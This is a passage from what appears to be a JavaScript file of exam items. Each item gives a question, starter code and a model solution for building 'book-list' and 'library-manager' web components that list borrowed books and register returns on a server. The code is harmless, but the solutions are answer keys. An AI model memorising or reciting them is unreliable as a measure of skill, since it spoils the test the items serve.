          q: `<p>In this task you are asked to write the JavaScript code of a GUI component <b>BookList</b> (custom tag <code>book-list</code>) that displays the books a user has borrowed.</p>
<div class="figure mock"><table style="width:auto"><tr><th>Title</th><th>Expiry</th><th></th></tr><tr><td>Designing Data-Intensive Applications</td><td>2026-12-20</td><td><button type="button" disabled>Return</button></td></tr></table></div>
<p>An order is represented by an object:</p>
~~~javascript
{ "id": 5, "title": "Designing Data-Intensive Applications", "expiry": "2026-12-20" }
~~~
<p>The property id must be stored with the order as the HTML custom data attribute <code>data-id</code>.</p>
<p>The HTML element class of BookList has three public methods:</p>
<ul><li><code>showorder(order)</code>: Adds the order at the <b>top</b> of the list. In parameter: Object. Return value: None.</li>
<li><code>removeorder(id)</code>: Removes the order with the given id from the view. In parameter: Integer. Return value: None.</li>
<li><code>addreturncallback(callback)</code>: Adds a callback that is run when the user clicks a button Return, with the id of the order as argument. This method does not update the view. In parameter: Function. Return value: Not required.</li></ul>
<p><b>Task:</b> Fill in the missing code.</p>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <table id="booklist">
        <thead>
            <tr><th>Title</th><th>Expiry</th></tr>
        </thead>
        <tbody></tbody>
    </table>\`;

const bookrow = document.createElement("template");
bookrow.innerHTML = \`
    <tr>
        <td></td>
        <td></td>
        <td><button type="button">Return</button></td>
    </tr>\`;

class BookList extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code, if necessary
    }

    addreturncallback(callback) {
        // More code
    }

    showorder(order) {
        // More code
    }

    removeorder(id) {
        // More code
    }
}
customElements.define('book-list', BookList);
`,
          sol: `~~~javascript
class BookList extends HTMLElement {
    #callbacks = new Map();
    #tbody;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        this.#tbody = shadow.getElementById("booklist").tBodies[0];
    }

    addreturncallback(callback) {
        const callbackid = Symbol("returncallback");
        this.#callbacks.set(callbackid, callback);
        return callbackid;
    }

    showorder(order) {
        const content = bookrow.content.cloneNode(true);
        const row = content.firstElementChild;
        row.dataset.id = order.id;
        row.cells[0].textContent = order.title;
        row.cells[1].textContent = order.expiry;
        const bt = row.cells[2].getElementsByTagName("button")[0];
        bt.addEventListener("click", () => { this.#onreturn(order.id) });
        this.#tbody.prepend(row);          // at the top of the list
    }

    removeorder(id) {
        const row = this.#tbody.querySelector(\`tr[data-id="\${id}"]\`);
        if (row !== null) {
            row.remove();
        }
    }

    #onreturn(id) {
        this.#callbacks.forEach(callback => callback(id));
    }
}
customElements.define('book-list', BookList);
~~~` },
        { label: "g (4%)", type: "code", lang: "javascript",
          q: `<p>The BookList component is used by a parent component <b>LibraryManager</b>. When the user returns a book, the return must be registered on the web server before the order is removed from the view.</p>
<p>The LibraryManager component uses a private method <code>#returnOnServer</code> to register the return on the web server. Observe: You are not asked to implement the method #returnOnServer.</p>
<ul><li><code>#returnOnServer(id)</code>: Registers on the server that the order is returned. In parameter: Integer. Return value: Promise. On response from the server the returned promise resolves, or if problems with the connection rejects. The resolved object has the properties <code>responseStatus</code> and <code>id</code>. The responseStatus property is true if the return was successfully registered, false otherwise.</li></ul>
<p>Implement the following functionality of LibraryManager:</p>
<ol><li>When the user clicks a button Return of BookList, the return is sent to the web server.</li><li>On response from the web server: if the return was registered, the order is removed from BookList and the text "Book returned" is displayed in the element with id message. Otherwise the text "Could not return book" is displayed.</li></ol>`,
          starter: `const template = document.createElement("template");
template.innerHTML = \`
    <h1>My borrowed books</h1>
    <p id="message"></p>
    <book-list></book-list>\`;

class LibraryManager extends HTMLElement {
    // Add the necessary private fields

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);
        // More code
    }

    // More code

    #returnOnServer(id) {
        /* You are asked to not implement this method */
    }
}
customElements.define('library-manager', LibraryManager);
`,
          sol: `~~~javascript
class LibraryManager extends HTMLElement {
    #booklist;
    #message;

    constructor() {
        super();
        const shadow = this.attachShadow({ mode: 'closed' });
        const content = template.content.cloneNode(true);
        shadow.append(content);

        this.#message = shadow.getElementById("message");
        this.#booklist = shadow.querySelector("book-list");
        this.#booklist.addreturncallback((id) => { this.#returnbook(id) });
    }

    async #returnbook(id) {
        try {
            const result = await this.#returnOnServer(id);
            if (result.responseStatus) {
                this.#booklist.removeorder(result.id);
                this.#message.textContent = "Book returned";
            } else {
                this.#message.textContent = "Could not return book";
            }
        } catch (error) {
            this.#message.textContent = "Could not return book";
        }
    }

    #returnOnServer(id) {
        /* You are asked to not implement this method */
    }
}
customElements.define('library-manager', LibraryManager);
~~~` }
      ]}
  ]
});
